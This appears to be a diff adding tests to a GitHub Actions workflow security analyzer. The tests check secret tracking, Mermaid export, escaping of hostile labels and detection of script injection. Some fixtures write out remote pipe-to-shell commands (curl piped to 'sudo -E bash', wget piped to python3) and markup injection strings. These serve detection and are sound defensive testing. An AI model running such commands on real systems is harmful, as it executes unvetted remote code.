@@ -1,7 +1,8 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
+import { readFileSync } from 'node:fs';
 import { spawnSync } from 'node:child_process';
-import { analyze, markdown } from '../src/analyzer.ts';
+import { analyze, markdown, mermaid } from '../src/analyzer.ts';
 import { examples } from '../src/examples.ts';
 
 const workflow = (body: string, prefix = 'on: push\npermissions: {}\n') => `${prefix}jobs:\n  test:\n    runs-on: ubuntu-latest\n${body}`;
@@ -98,4 +99,91 @@ test('CLI stdin JSON and opt-in failure behavior', () => {
   const high = spawnSync(process.execPath, ['src/cli.ts', '-', '--fail-on-high'], { input: examples.risky });
   assert.equal(high.status, 1);
   const invalid = spawnSync(process.execPath, ['src/cli.ts', '-'], { input: 'jobs: [' }); assert.equal(invalid.status, 2);
+});
+
+test('dynamic workflow env secrets remain visible alongside named references', () => {
+  const r = analyze(workflow('    steps:\n      - run: echo ok\n        env:\n          TOKEN: ${{ secrets.TOKEN }}', 'on: push\nenv:\n  DYNAMIC: ${{ secrets[inputs.secret_name] }}\npermissions: {}\n'));
+  assert.deepEqual(r.jobs[0].secrets, ['TOKEN', '(dynamic secret expression)']);
+  const overridden = analyze(workflow('    env:\n      DYNAMIC: local\n    steps: []', 'on: push\nenv:\n  DYNAMIC: ${{ secrets[inputs.name] }}\n'));
+  assert.deepEqual(overridden.jobs[0].secrets, []);
+  for (const value of ["${{ secrets['TOKEN'] }}", '${{ secrets[ "TOKEN" ] }}']) {
+    const literal = analyze(workflow(`    env:\n      TOKEN: ${value}\n    steps: []`));
+    assert.ok(!literal.jobs[0].secrets.includes('(dynamic secret expression)'));
+    assert.deepEqual(literal.jobs[0].secrets, ['TOKEN']);
+  }
+});
+
+test('Mermaid preserves dependency direction and disconnected jobs with generated IDs', () => {
+  const r = analyze('on: push\njobs:\n  end:\n    runs-on: ubuntu-latest\n    steps: []\n  deploy:\n    needs: end\n    runs-on: ubuntu-latest\n    steps: []\n  separate:\n    runs-on: ubuntu-latest\n    steps: []');
+  const diagram = mermaid(r);
+  assert.match(diagram, /job0\["end"\]/);
+  assert.match(diagram, /job0 --> job1/);
+  assert.match(diagram, /job2\["separate"\]/);
+  assert.throws(() => mermaid(analyze('jobs: [')), /Fix workflow errors/);
+});
+
+test('exports keep hostile workflow labels inert and prevent fence escapes', () => {
+  const hostile = '" ]\n```\n![track](https://example.invalid/pixel) <img src=x> & #quot;';
+  const r = analyze(workflow('    steps: []'));
+  r.name = hostile; r.jobs[0].name = hostile; r.jobs[0].runner = hostile;
+  r.warnings.push(hostile);
+  const diagram = mermaid(r);
+  assert.ok(!diagram.includes('<img'));
+  assert.ok(!diagram.includes('```'));
+  assert.equal(diagram.split('\n').length, 4);
+  const report = markdown(r);
+  assert.equal((report.match(/```/g) || []).length, 2);
+  assert.ok(!report.includes('![track]'));
+  assert.ok(!report.includes('<img'));
+  assert.match(report, /&#60;img/);
+});
+
+test('CLI diagram output and format conflicts have predictable exit codes', () => {
+  const run = (args: string[], input = examples.minimal) => spawnSync(process.execPath, ['src/cli.ts', '-', ...args], { input, encoding: 'utf8' });
+  const diagram = run(['--mermaid']);
+  assert.equal(diagram.status, 0); assert.match(diagram.stdout, /^flowchart LR/);
+  assert.equal(run(['--mermaid', '--json']).status, 2);
+  const invalid = run(['--mermaid'], 'jobs: [');
+  assert.equal(invalid.status, 2); assert.equal(invalid.stdout, ''); assert.ok(invalid.stderr);
+  assert.equal(run(['--mermaid', '--fail-on-high'], examples.risky).status, 1);
+});
+
+test('job-level container triggers unpinned hint unless digest-pinned', () => {
+  const mutable = analyze(workflow('    container: node:latest\n    steps: []'));
+  assert.ok(mutable.findings.some(f => f.rule === 'unpinned-container' && f.job === 'test'));
+  const pinned = analyze(workflow(`    container: node@sha256:${'b'.repeat(64)}\n    steps: []`));
+  assert.ok(!pinned.findings.some(f => f.rule === 'unpinned-container'));
+});
+
+test('expanded untrusted contexts detect script injection', () => {
+  const expressions = [
+    'github.event.review_comment.body',
+    'github.event.head_commit.message',
+    'github.event.workflow_run.head_branch',
+    'github.event.workflow_run.display_title',
+    'github.event.inputs.command',
+    'inputs.command',
+    "inputs['command']",
+    'github.event.inputs["command"]',
+  ];
+  for (const expression of expressions) {
+    const result = analyze(workflow(`    steps:\n      - run: echo "${'${{'} ${expression} }}"`));
+    assert.ok(result.findings.some(f => f.rule === 'script-injection'), `${expression} should be flagged`);
+  }
+});
+
+test('composite action passes workflow-controlled inputs through environment variables', () => {
+  const action = readFileSync(new URL('../action.yml', import.meta.url), 'utf8').replace(/\r\n/g, '\n');
+  const runBlock = action.split('      run: |\n')[1];
+  assert.ok(runBlock, 'action should define its run script');
+  assert.doesNotMatch(runBlock, /\$\{\{/);
+  assert.match(action, /WORKFLOW_LENS_WORKFLOW: \$\{\{ inputs\.workflow \}\}/);
+  assert.match(action, /args=\("\$WORKFLOW_LENS_WORKFLOW"\)/);
+});
+
+test('remote script execution detects sudo flags and python piping', () => {
+  const sudoScript = analyze(workflow('    steps:\n      - run: curl -fsSL https://example.invalid/install.sh | sudo -E bash -'));
+  assert.ok(sudoScript.findings.some(f => f.rule === 'remote-script'));
+  const pythonScript = analyze(workflow('    steps:\n      - run: wget -qO- https://example.invalid/run.py | python3'));
+  assert.ok(pythonScript.findings.some(f => f.rule === 'remote-script'));
 });
